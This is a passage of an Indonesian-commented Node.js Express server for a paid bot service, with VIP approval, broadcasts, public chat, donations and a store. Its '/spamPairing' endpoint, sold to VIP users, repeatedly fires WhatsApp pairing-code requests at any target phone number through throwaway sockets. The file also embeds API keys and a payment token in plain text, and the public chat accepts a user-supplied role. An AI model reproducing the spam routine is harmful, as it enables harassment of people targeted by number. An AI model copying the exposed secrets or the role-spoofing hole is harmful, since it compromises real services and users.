  if (!requester || requester.role !== 'owner') {
    return res.status(403).json({ valid: false, message: 'Only owner' });
  }

  const requests = loadVipRequests();
  const r = requests.find(x => x.id === id);
  if (!r) return res.status(404).json({ valid: false, message: 'Not found' });

  const fp = path.join(__dirname, r.proofFile);
  if (!fs.existsSync(fp)) return res.status(404).json({ valid: false, message: 'Proof file missing' });

  // Prevent path traversal
  const safePath = path.resolve(fp);
  if (!safePath.startsWith(path.join(__dirname, 'proofs'))) {
    return res.status(400).json({ valid: false, message: 'Invalid path' });
  }

  return res.sendFile(safePath);
});

// POST /approveVip  Body: { key, requestId }
// Owner only. Set user role → vip, extend expiredDate.
app.post('/approveVip', (req, res) => {
  const { key, requestId } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') {
    return res.status(403).json({ valid: false, message: 'Only owner can approve' });
  }

  const result = doApproveVip(requestId, owner.username);
  if (!result.ok) {
    return res.json({ valid: false, message: result.message });
  }
  notifyOwnerVipDecision(result.request, owner.username, 'approved', { expiredDate: result.user.expiredDate }).catch(() => {});
  return res.json({ valid: true, request: result.request, user: result.user });
});

// POST /rejectVip  Body: { key, requestId, reason }
// Owner only.
app.post('/rejectVip', (req, res) => {
  const { key, requestId, reason } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') {
    return res.status(403).json({ valid: false, message: 'Only owner can reject' });
  }

  const result = doRejectVip(requestId, owner.username, reason);
  if (!result.ok) {
    return res.json({ valid: false, message: result.message });
  }
  notifyOwnerVipDecision(result.request, owner.username, 'rejected', { reason: result.request.rejectReason }).catch(() => {});
  return res.json({ valid: true, request: result.request });
});

// Alias prefix /api/vip/* biar konsisten sama style lain
app.post('/api/vip/request', (req, res) => { req.url = '/requestVip'; app.handle(req, res); });
app.get ('/api/vip/my',      (req, res) => { req.url = '/myVipRequest?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get ('/api/vip/list',    (req, res) => { req.url = '/listVipRequests?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get ('/api/vip/proof',   (req, res) => { req.url = '/vipProof?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/vip/approve', (req, res) => { req.url = '/approveVip'; app.handle(req, res); });
app.post('/api/vip/reject',  (req, res) => { req.url = '/rejectVip'; app.handle(req, res); });

// ============================================================
// ===== BROADCAST NOTIFICATION SYSTEM =======================
// ============================================================
// Owner bisa kirim notifikasi custom (maintenance/update/info/warning)
// ke SEMUA user. User dapet popup pas buka app.
// Storage: broadcasts.json + broadcasts_dismissed.json
// ============================================================

const broadcastsFile = path.join(__dirname, 'broadcasts.json');

function loadBroadcasts() {
  try {
    if (!fs.existsSync(broadcastsFile)) return [];
    return JSON.parse(fs.readFileSync(broadcastsFile, 'utf8'));
  } catch (_) { return []; }
}
function saveBroadcasts(data) {
  fs.writeFileSync(broadcastsFile, JSON.stringify(data, null, 2));
}

app.post('/sendBroadcast', (req, res) => {
  const { key, type, title, message, expiresInHours } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid session key' });

  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') {
    return res.status(403).json({ valid: false, message: 'Only owner can send broadcast' });
  }

  const validTypes = ['maintenance', 'update', 'info', 'warning'];
  const bType = (type || 'info').toString().toLowerCase();
  if (!validTypes.includes(bType)) {
    return res.status(400).json({ valid: false, message: `Type tidak valid. Pilih: ${validTypes.join(', ')}` });
  }

  const bTitle = (title || '').toString().trim();
  const bMessage = (message || '').toString().trim();
  if (bTitle.length === 0) return res.status(400).json({ valid: false, message: 'Title wajib diisi' });
  if (bMessage.length === 0) return res.status(400).json({ valid: false, message: 'Message wajib diisi' });
  if (bTitle.length > 100) return res.status(400).json({ valid: false, message: 'Title maksimal 100 karakter' });
  if (bMessage.length > 2000) return res.status(400).json({ valid: false, message: 'Message maksimal 2000 karakter' });

  const hours = parseFloat(expiresInHours);
  const validHours = (typeof hours === 'number' && !isNaN(hours) && hours >= 0) ? hours : 24;

  let expiresAt = null;
  if (validHours > 0) {
    const d = new Date();
    d.setHours(d.getHours() + validHours);
    expiresAt = d.toISOString();
  }

  const broadcast = {
    id: `bc_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`,
    type: bType,
    title: bTitle,
    message: bMessage,
    createdAt: new Date().toISOString(),
    createdBy: owner.username,
    expiresAt: expiresAt,
  };

  const broadcasts = loadBroadcasts();
  broadcasts.push(broadcast);
  saveBroadcasts(broadcasts);

  console.log(`[BROADCAST] ${owner.username} sent broadcast ${broadcast.id} (type=${bType})`);
  fs.appendFileSync('logUser.txt', `${owner.username} SentBroadcast ${broadcast.id} ${bType} ${bTitle}\n`);

  return res.json({ valid: true, broadcast });
});

app.get('/getBroadcasts', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid session key' });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: 'User not found' });

  const dismissedFile = path.join(__dirname, 'broadcasts_dismissed.json');
  let dismissed = {};
  try {
    if (fs.existsSync(dismissedFile)) {
      dismissed = JSON.parse(fs.readFileSync(dismissedFile, 'utf8'));
    }
  } catch (_) {}
  const userDismissed = dismissed[user.username] || [];

  const now = Date.now();
  const broadcasts = loadBroadcasts().filter(b => {
    if (userDismissed.includes(b.id)) return false;
    if (b.expiresAt && new Date(b.expiresAt).getTime() < now) return false;
    return true;
  });

  broadcasts.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  return res.json({ valid: true, broadcasts });
});

app.post('/dismissBroadcast', (req, res) => {
  const { key, broadcastId } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid session key' });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: 'User not found' });

  if (!broadcastId) return res.status(400).json({ valid: false, message: 'broadcastId wajib diisi' });

  const dismissedFile = path.join(__dirname, 'broadcasts_dismissed.json');
  let dismissed = {};
  try {
    if (fs.existsSync(dismissedFile)) {
      dismissed = JSON.parse(fs.readFileSync(dismissedFile, 'utf8'));
    }
  } catch (_) {}
  if (!dismissed[user.username]) dismissed[user.username] = [];
  if (!dismissed[user.username].includes(broadcastId)) {
    dismissed[user.username].push(broadcastId);
    try {
      fs.writeFileSync(dismissedFile, JSON.stringify(dismissed, null, 2));
    } catch (e) {
      return res.status(500).json({ valid: false, message: 'Gagal simpan dismiss: ' + e.message });
    }
  }

  return res.json({ valid: true, dismissed: dismissed[user.username] });
});

app.get('/listBroadcasts', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid session key' });

  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') {
    return res.status(403).json({ valid: false, message: 'Only owner can list broadcasts' });
  }

  const broadcasts = loadBroadcasts();
  broadcasts.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  return res.json({ valid: true, broadcasts });
});

app.post('/deleteBroadcast', (req, res) => {
  const { key, broadcastId } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid session key' });

  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') {
    return res.status(403).json({ valid: false, message: 'Only owner can delete broadcast' });
  }

  if (!broadcastId) return res.status(400).json({ valid: false, message: 'broadcastId wajib diisi' });

  const broadcasts = loadBroadcasts();
  const idx = broadcasts.findIndex(b => b.id === broadcastId);
  if (idx === -1) return res.status(404).json({ valid: false, message: 'Broadcast not found' });

  const deleted = broadcasts[idx];
  broadcasts.splice(idx, 1);
  saveBroadcasts(broadcasts);

  console.log(`[BROADCAST] ${owner.username} deleted broadcast ${broadcastId}`);
  fs.appendFileSync('logUser.txt', `${owner.username} DeletedBroadcast ${broadcastId}\n`);

  return res.json({ valid: true, deleted });
});



// ========== SPAM PAIRING CODE ==========
// Kirim request pairing code ke target berkali-kali
app.get("/spamPairing", async (req, res) => {
  const { key, target, pairingCode } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  const role = (user.role || "member").toLowerCase();
  const allowedRoles = ['vip', 'svip', 'vvip', 'exec', 'staf', 'owner', 'founder', 'dev', 'developer', 'creator', 'high owner', 'high admin', 'seles'];
  if (!allowedRoles.includes(role)) {
    return res.json({ valid: false, message: "Pair spam hanya untuk VIP+" });
  }

  let cleanTarget = (target || "").replace(/\D/g, "");
  if (!cleanTarget || cleanTarget.length < 8) {
    return res.json({ valid: false, message: "Invalid target number" });
  }

  // Respond IMMEDIATELY
  res.json({ valid: true, sended: true, target: cleanTarget });

  // Background: Spam pairing codes using fresh temp sockets
  // Each socket stays alive 15s after requesting pairing code,
  // giving WA enough time to push the notification to target.
  setImmediate(async () => {
    const code = pairingCode || "OMHCMBUD";
    let successCount = 0;

    for (let i = 0; i < 3; i++) {
      let tempDir = null;
      let tempSock = null;
      try {
        tempDir = path.join('temppair', `${Date.now()}_${i}_${Math.random().toString(36).substring(7)}`);
        if (!fs.existsSync('temppair')) fs.mkdirSync('temppair', { recursive: true });
        fs.mkdirSync(tempDir, { recursive: true });

        const { state, saveCreds } = await useMultiFileAuthState(tempDir);
        const { version } = await fetchLatestBaileysVersion();

        tempSock = makeWASocket({
          keepAliveIntervalMs: 10000,
          logger: pino({ level: "silent" }),
          auth: state,
          syncFullHistory: false,
          markOnlineOnConnect: false,
          connectTimeoutMs: 20000,
          defaultQueryTimeoutMs: 60000,
          generateHighQualityLinkPreview: false,
          browser: ["Ubuntu", "Chrome", "20.0.04"],
          version,
          printQRInTerminal: false,
        });

        tempSock.ev.on("creds.update", saveCreds);

        // Wait for connection — fresh socket connects to WA as "new device"
        // It won't be authenticated, but WA allows pairing code requests
        const connected = await new Promise((resolve) => {
          let resolved = false;
          const timeout = setTimeout(() => {
            if (!resolved) { resolved = true; resolve("timeout"); }
          }, 15000);

          tempSock.ev.on("connection.update", ({ connection, lastDisconnect }) => {
            if (resolved) return;
            if (connection === "open") {
              clearTimeout(timeout);
              resolved = true;
              resolve("open");
            } else if (connection === "close") {
              const statusCode = lastDisconnect?.error?.output?.statusCode;
              // 515 = need restart, 503 = service unavailable, etc.
              // For fresh socket, close might mean it needs QR scan
              // But requestPairingCode can still work before close
              clearTimeout(timeout);
              resolved = true;
              resolve("close_" + statusCode);
            }
          });
        });

        console.log(`[PAIR-SPAM] ${i+1}/3 socket state: ${connected}`);

        // Try requestPairingCode REGARDLESS of connection state
        // Baileys allows calling this even if socket hasn't fully connected
        try {
          const prc = await tempSock.requestPairingCode(cleanTarget, code);
          console.log(`[PAIR-SPAM] ${i+1}/3 → ${cleanTarget} Code: ${prc}`);
          successCount++;

          // Keep socket alive for 10 seconds so WA can push notification
          await sleep(10000);
        } catch (e) {
          console.warn(`[PAIR-SPAM] ${i+1}/3 requestPairingCode err: ${e.message}`);
        }

        // Cleanup
        try { tempSock.end?.(); } catch(_) {}
        try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch(_) {}

      } catch (e) {
        console.warn(`[PAIR-SPAM] ${i+1}/3 error: ${e.message}`);
        try { tempSock?.end?.(); } catch(_) {}
        try { if (tempDir) fs.rmSync(tempDir, { recursive: true, force: true }); } catch(_) {}
      }

      if (i < 2) await sleep(3000);
    }

    console.log(`[PAIR-SPAM] ${user.username} → ${cleanTarget} done. Success: ${successCount}/3`);
  });
});


// ========== PUBLIC CHAT SYSTEM ==========
const publicChatFile = path.join(__dirname, 'public_chat.json');

function loadPublicChat() {
  try {
    if (!fs.existsSync(publicChatFile)) return [];
    return JSON.parse(fs.readFileSync(publicChatFile, 'utf8'));
  } catch (_) { return []; }
}
function savePublicChat(data) {
  try { fs.writeFileSync(publicChatFile, JSON.stringify(data.slice(-200), null, 2)); } catch (_) {}
}

app.post('/get-public-chat', (req, res) => {
  const { key } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });
  const messages = loadPublicChat();
  return res.json({ valid: true, success: true, messages });
});

app.post('/send-public-chat', (req, res) => {
  const { key, username, text, imageBase64, role } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: 'User not found' });
  const userRole = role || user.role || 'member';
  const msgText = (text || '').toString().trim();
  const msgImage = imageBase64 ? imageBase64.toString() : null;
  if (msgText.length === 0 && !msgImage) return res.status(400).json({ valid: false, message: 'Message or image required' });
  if (msgText.length > 1000) return res.status(400).json({ valid: false, message: 'Message too long' });
  const message = {
    id: `msg_${Date.now()}_${crypto.randomBytes(3).toString('hex')}`,
    from: user.username,
    role: userRole,
    text: msgText,
    image: msgImage,
    time: new Date().toISOString(),
  };
  const messages = loadPublicChat();
  messages.push(message);
  savePublicChat(messages);
  return res.json({ valid: true, success: true, message });
});

// ========== DONATION SYSTEM ==========
const donationsFile = path.join(__dirname, 'donations.json');
function loadDonations() {
  try { if (!fs.existsSync(donationsFile)) return []; return JSON.parse(fs.readFileSync(donationsFile, 'utf8')); } catch (_) { return []; }
}
function saveDonations(data) { try { fs.writeFileSync(donationsFile, JSON.stringify(data, null, 2)); } catch (_) {} }

app.post('/donate', (req, res) => {
  const { key, amount, proofBase64 } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: 'User not found' });
  const amt = parseInt(amount);
  if (!amt || amt < 1000) return res.status(400).json({ valid: false, message: 'Min Rp 1000' });
  if (!proofBase64 || proofBase64.length < 100) return res.status(400).json({ valid: false, message: 'Proof required' });
  let rawB64 = proofBase64, ext = 'jpg';
  const m = proofBase64.match(/^data:([a-zA-Z0-9/+.-]+);base64,(.+)$/);
  if (m) { ext = m[1].includes('png') ? 'png' : 'jpg'; rawB64 = m[2]; }
  const id = `don_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
  try { fs.writeFileSync(path.join(__dirname, 'proofs', `${id}.${ext}`), Buffer.from(rawB64, 'base64')); } catch (e) { return res.status(500).json({ valid: false, message: 'Gagal simpan proof' }); }
  const donation = { id, username: user.username, amount: amt, proofFile: `proofs/${id}.${ext}`, status: 'pending', createdAt: new Date().toISOString(), decidedAt: null, decidedBy: null };
  const donations = loadDonations(); donations.push(donation); saveDonations(donations);
  return res.json({ valid: true, donation });
});

app.get('/topDonors', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const donations = loadDonations().filter(d => d.status === 'approved');
  const donorMap = {};
  for (const d of donations) {
    if (!donorMap[d.username]) donorMap[d.username] = { username: d.username, totalAmount: 0, count: 0 };
    donorMap[d.username].totalAmount += d.amount;
    donorMap[d.username].count++;
  }
  const donors = Object.values(donorMap).sort((a, b) => b.totalAmount - a.totalAmount).slice(0, 10);
  const stats = { totalDonors: Object.keys(donorMap).length, totalDonated: donations.reduce((s, d) => s + d.amount, 0), totalDonations: donations.length };
  return res.json({ valid: true, donors, stats });
});

app.get('/listDonations', (req, res) => {
  const { key, status } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') return res.status(403).json({ valid: false, message: 'Only owner' });
  let donations = loadDonations();
  if (status && status !== 'all') donations = donations.filter(d => d.status === status);
  donations.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  return res.json({ valid: true, donations });
});

app.post('/approveDonation', (req, res) => {
  const { key, donationId } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') return res.status(403).json({ valid: false, message: 'Only owner' });
  const donations = loadDonations();
  const idx = donations.findIndex(d => d.id === donationId);
  if (idx === -1) return res.status(404).json({ valid: false, message: 'Not found' });
  donations[idx].status = 'approved';
  donations[idx].decidedAt = new Date().toISOString();
  donations[idx].decidedBy = owner.username;
  saveDonations(donations);
  return res.json({ valid: true, donation: donations[idx] });
});

app.post('/rejectDonation', (req, res) => {
  const { key, donationId, reason } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') return res.status(403).json({ valid: false, message: 'Only owner' });
  const donations = loadDonations();
  const idx = donations.findIndex(d => d.id === donationId);
  if (idx === -1) return res.status(404).json({ valid: false, message: 'Not found' });
  donations[idx].status = 'rejected';
  donations[idx].decidedAt = new Date().toISOString();
  donations[idx].decidedBy = owner.username;
  donations[idx].rejectReason = reason || 'Rejected';
  saveDonations(donations);
  return res.json({ valid: true, donation: donations[idx] });
});


// ============================================================
// ===== STORE: PANEL PTERODACTYL & OMHC NOKOS ================
// ============================================================
// Panel Pterodactyl → manual approval (mirrors VIP flow)
// Omhc Nokos       → saldo system + RumahOTP API, 4-step flow:
//   services → countries (pricelist) → operators → order → poll OTP
//   supports cancel order + saldo refund
// ============================================================

const TESTIMONI_CHANNEL = "@kiuchan12";

// Omhc Nokos config (powered by RumahOTP API)
const NOKOS_API_KEY = "rk-dev-P9A60n58TXOHQBkA8OEWtSd5jH8lbgND";
const NOKOS_API_BASE = "https://www.rumahotp.io/api";
const NOKOS_MARKUP  = 800; // profit per nomor
const NOKOS_MAX_RETRY = 3;

// ── Payment gateway config (Orkut via luxz-api gateway) ──
// Used for auto top-up saldo Nokos (no manual upload proof)
const PAYMENT_CONFIG = {
  method: 'orkut',
  apikey: 'Omhc',
  username: 'tokoomhc',
  token: '2420562:SUVDf2e9Cv5Ao4MFyin1HGcqasffgsdfgPwJasL',
};
const PAYMENT_ORKUT_BASE = 'https://luxz-api.vercel.app/orderkuota';
const TOPUP_POLL_INTERVAL_MS = 5000;  // server polls every 5s
const TOPUP_EXPIRE_MS = 5 * 60 * 1000; // 5 minutes

// In-memory topup tracking: { transactionId: { username, amount, createdAt, paid, expired } }
const topupTracker = new Map();

// Helper: escape Markdown special chars (for safer captions)
function escapeMd(text) {
  return String(text || '').replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
}

// Helper: create QRIS payment (returns {transactionId, amount, qrisImageUrl, qrString})
async function createTopupQris(amount) {
  try {
    const url = `${PAYMENT_ORKUT_BASE}/createpayment?apikey=${encodeURIComponent(PAYMENT_CONFIG.apikey)}&amount=${Number(amount)}&username=${encodeURIComponent(PAYMENT_CONFIG.username)}&token=${encodeURIComponent(PAYMENT_CONFIG.token)}`;
    const { data } = await axios.get(url, { timeout: 15000 });
    if (!data || !data.result) return null;
    const r = data.result;
    return {
      transactionId: r.idtransaksi,
      amount: Number(r.jumlah || amount),
      qrisImageUrl: r.imageqris?.url || r.imageqris || '',
      qrString: r.qr_string || '',
    };
  } catch (e) {
    console.error('[TOPUP-QRIS] create error:', e.message);
    return null;
  }
}

// Helper: check payment status via mutasiqr (looks for kredit == amount)
async function checkTopupStatus(transactionId, amount) {
  try {
    const url = `${PAYMENT_ORKUT_BASE}/mutasiqr?apikey=${encodeURIComponent(PAYMENT_CONFIG.apikey)}&username=${encodeURIComponent(PAYMENT_CONFIG.username)}&token=${encodeURIComponent(PAYMENT_CONFIG.token)}`;
    const { data } = await axios.get(url, { timeout: 10000 });
    const list = data?.result;
    if (!Array.isArray(list)) return { paid: false };
    const amt = parseInt(String(amount).replace(/[^0-9]/g, ''));
    const paid = list.some(i => {
      const kredit = parseInt(String(i.kredit || i.amount || 0).replace(/[^0-9]/g, ''));
      return kredit === amt;
    });
    return { paid, raw: list };
  } catch (e) {
    console.error('[TOPUP-QRIS] check error:', e.message);
    return { paid: false };
  }
}

// Background auto-poller: checks unpaid topups every 10s
setInterval(async () => {
  if (topupTracker.size === 0) return;
  const now = Date.now();
  for (const [txId, info] of topupTracker.entries()) {
    if (info.paid) {
      topupTracker.delete(txId);
      continue;
    }
    if (now - info.createdAt > TOPUP_EXPIRE_MS) {
      console.log(`[TOPUP-POLL] ${txId} expired (no payment within 5min)`);
      topupTracker.delete(txId);
      continue;
    }
    try {
      const result = await checkTopupStatus(txId, info.amount);
      if (result.paid) {
        info.paid = true;
        const newSaldo = addUserSaldo(info.username, info.amount);
        console.log(`[TOPUP-POLL] ${txId} PAID - added Rp ${info.amount} to ${info.username}. New saldo: Rp ${newSaldo}`);

        // Mark in store_orders.json
        const orders = loadStoreOrders();
        const idx = orders.findIndex(o => o.id === txId);
        if (idx !== -1) {
          orders[idx].status = 'topup_approved';
          orders[idx].decidedAt = new Date().toISOString();
          orders[idx].decidedBy = 'auto-qris';
          orders[idx].newSaldo = newSaldo;
          saveStoreOrders(orders);
        }

        // Send testimoni to channel
        sendTestimoniToChannel({
          username: info.username,
          productName: 'Top Up Saldo (Auto QRIS)',
          price: info.amount,
          type: 'topup',
        }).catch(() => {});
      }
    } catch (e) {
      console.error(`[TOPUP-POLL] ${txId} check error:`, e.message);
    }
  }
}, TOPUP_POLL_INTERVAL_MS);

// Panel config (Pterodactyl)
const panelConfig = {
    domain: "https://omhc.angkasanyabobo.my.id",
    apikey: "ptlc_t3NgEF6b8XZCf6dPv3Rtyi6soeAc3o6z8srp8nXSfA7",
    eggId: 15,
    locationId: 1,
    startup: 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; /usr/local/bin/npm install; /usr/local/bin/${CMD_RUN}',
    image: "ghcr.io/parkervcp/yolks:nodejs_18"
};

// Store orders file (panel + nokos + topup)
const storeOrdersFile = path.join(__dirname, 'store_orders.json');
function loadStoreOrders() {
  try {
    if (!fs.existsSync(storeOrdersFile)) return [];
    return JSON.parse(fs.readFileSync(storeOrdersFile, 'utf8'));
  } catch (_) { return []; }
}
function saveStoreOrders(data) {
  try { fs.writeFileSync(storeOrdersFile, JSON.stringify(data, null, 2)); } catch (_) {}
}

// Saldo store: { username: number }
const saldoFile = path.join(__dirname, 'saldo_store.json');
function loadSaldo() {
  try {
    if (!fs.existsSync(saldoFile)) return {};
    return JSON.parse(fs.readFileSync(saldoFile, 'utf8'));
  } catch (_) { return {}; }
}
function saveSaldo(data) {
  try { fs.writeFileSync(saldoFile, JSON.stringify(data, null, 2)); } catch (_) {}
}
function getUserSaldo(username) {
  return Number(loadSaldo()[username] || 0);
}
function addUserSaldo(username, amount) {
  const s = loadSaldo();
  s[username] = Number(s[username] || 0) + Number(amount);
  saveSaldo(s);
  return s[username];
}
function deductUserSaldo(username, amount) {
  const s = loadSaldo();
  const cur = Number(s[username] || 0);
  if (cur < Number(amount)) return false;
  s[username] = cur - Number(amount);
  saveSaldo(s);
  return true;
}

// Store proofs folder
const storeProofDir = path.join(__dirname, 'store_proofs');
if (!fs.existsSync(storeProofDir)) fs.mkdirSync(storeProofDir, { recursive: true });

// ============================================================
// CANVAS THUMBNAIL GENERATOR
// ============================================================
let canvasLib = null;
try { canvasLib = require('canvas'); } catch (e) {
  console.warn('[STORE] canvas module not available, testimoni will be text-only:', e.message);
}

async function generateTestimoniThumb({ username, totalOrders, price, productName, type }) {
  if (!canvasLib) return null;
  try {
    const { createCanvas } = canvasLib;
    const W = 900, H = 560;
    const c = createCanvas(W, H);
    const ctx = c.getContext('2d');

    const grad = ctx.createLinearGradient(0, 0, W, H);
    grad.addColorStop(0, '#0a0a0a');
    grad.addColorStop(1, '#1a0606');
    ctx.fillStyle = grad;
    ctx.fillRect(0, 0, W, H);

    ctx.fillStyle = '#FF3B30';
    ctx.fillRect(0, 0, W, 10);

    ctx.beginPath();
    ctx.moveTo(W - 220, 0);
    ctx.lineTo(W, 0);
    ctx.lineTo(W, 220);
    ctx.closePath();
    ctx.fillStyle = '#FF3B30';
    ctx.fill();

    ctx.beginPath();
    ctx.moveTo(W - 180, 0);
    ctx.lineTo(W, 0);
    ctx.lineTo(W, 180);
    ctx.closePath();
    ctx.fillStyle = '#0a0a0a';
    ctx.fill();

    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 44px sans-serif';
    ctx.fillText('YAKUZAX', 40, 80);
    ctx.fillStyle = '#FF3B30';
    ctx.fillText('SILENCE', 280, 80);

    ctx.fillStyle = '#9CA3AF';
    ctx.font = '20px sans-serif';
    ctx.fillText('Toko Mbud  •  Testimoni Pembelian', 40, 115);

    ctx.strokeStyle = '#FF3B30';
    ctx.lineWidth = 2;
    ctx.beginPath();
    ctx.moveTo(40, 150);
    ctx.lineTo(280, 150);
    ctx.stroke();

    const typeLabel = type === 'panel' ? 'PANEL PTERODACTYL' : (type === 'nokos' ? 'OMHC NOKOS' : 'TOP UP SALDO');
    ctx.fillStyle = '#FF3B30';
    ctx.fillRect(40, 180, 270, 36);
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 16px sans-serif';
    ctx.fillText(typeLabel, 56, 205);

    ctx.fillStyle = '#9CA3AF';
    ctx.font = '18px sans-serif';
    ctx.fillText('USER', 40, 270);
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 32px sans-serif';
    ctx.fillText(String(username || 'unknown').slice(0, 22), 40, 305);

    ctx.fillStyle = '#9CA3AF';
    ctx.font = '18px sans-serif';
    ctx.fillText('PRODUK', 40, 360);
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 28px sans-serif';
    ctx.fillText(String(productName || '-').slice(0, 28), 40, 395);

    ctx.fillStyle = '#9CA3AF';
    ctx.font = '18px sans-serif';
    ctx.fillText('HARGA', 40, 450);
    ctx.fillStyle = '#FF3B30';
    ctx.font = 'bold 34px sans-serif';
    ctx.fillText('Rp ' + Number(price || 0).toLocaleString('id-ID'), 40, 490);

    ctx.fillStyle = '#9CA3AF';
    ctx.font = '18px sans-serif';
    ctx.fillText('TOTAL ORDER', 560, 360);
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 48px sans-serif';
    ctx.fillText(String(totalOrders || 0), 560, 410);

    ctx.fillStyle = '#FF3B30';
    ctx.fillRect(0, H - 50, W, 50);
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 18px sans-serif';
    ctx.fillText('TERIMA KASIH SUDAH MEMBELI DI TOKO MBUD', 40, H - 18);

    ctx.fillStyle = '#FFFFFF';
    ctx.font = '14px sans-serif';
    const dt = new Date().toLocaleString('id-ID', { dateStyle: 'medium', timeStyle: 'short' });
    ctx.fillText(dt, W - 260, H - 18);

    return c.toBuffer('image/png');
  } catch (e) {
    console.error('[STORE] generateTestimoniThumb error:', e.message);
    return null;
  }
}

async function sendTestimoniToChannel({ username, productName, price, type }) {
  if (!bot) return;
  try {
    const orders = loadStoreOrders();
    const totalOrders = orders.filter(o =>
      o.username === username &&
      (o.status === 'approved' || o.status === 'active' || o.status === 'topup_approved' || o.status === 'completed')
    ).length;

    const thumbBuf = await generateTestimoniThumb({
      username, totalOrders, price, productName, type
    });

    const caption =
      `🛒 *TESTIMONI TOKO MBUD*\n\n` +
      `👤 User: *${username}*\n` +
      `📦 Produk: *${productName}*\n` +
      `💰 Harga: *Rp ${Number(price || 0).toLocaleString('id-ID')}*\n` +
      `🔢 Total order user: *${totalOrders}*\n` +
      `🕒 Waktu: ${new Date().toLocaleString('id-ID')}\n\n` +
      `— *YakuzaXsilence* | Toko Mbud`;

    if (thumbBuf) {
      await bot.sendPhoto(TESTIMONI_CHANNEL, thumbBuf, { caption, parse_mode: 'Markdown' });
    } else {
      await bot.sendMessage(TESTIMONI_CHANNEL, caption, { parse_mode: 'Markdown' });
    }
    console.log(`[STORE-TESTIMONI] Sent to ${TESTIMONI_CHANNEL} for ${username} (${type})`);
  } catch (err) {
    console.error('[STORE-TESTIMONI] Failed:', err.message);
    try {
      const txt = `🛒 TESTIMONI: ${username} beli ${productName} (Rp ${Number(price||0).toLocaleString('id-ID')})`;
      await bot.sendMessage(TESTIMONI_CHANNEL, txt);
    } catch (_) {}
  }
}

// Notify owner of new panel order — robust: HTML parse, retry, fallback to text
async function notifyOwnerPanelOrder(order) {
  if (!bot || !OWNER_ID) {
    console.error('[STORE-PANEL] Cannot notify: bot or OWNER_ID missing', { bot: !!bot, OWNER_ID });
    return;
  }
  const proofPath = order.proofFile ? path.join(__dirname, order.proofFile) : null;
  const proofExists = proofPath && fs.existsSync(proofPath);

  // Use HTML parse_mode (safer than Markdown — no need to escape asterisks in username)
  const caption =
    `🛒 <b>NEW PANEL ORDER</b>\n\n` +
    `👤 Username: <b>${order.username}</b>\n` +
    `📦 Panel: <b>${order.panelName}</b>\n` +
    `💰 Harga: <b>Rp ${Number(order.price).toLocaleString('id-ID')}</b>\n` +
    `🕒 Waktu: ${new Date(order.createdAt).toLocaleString('id-ID')}\n` +
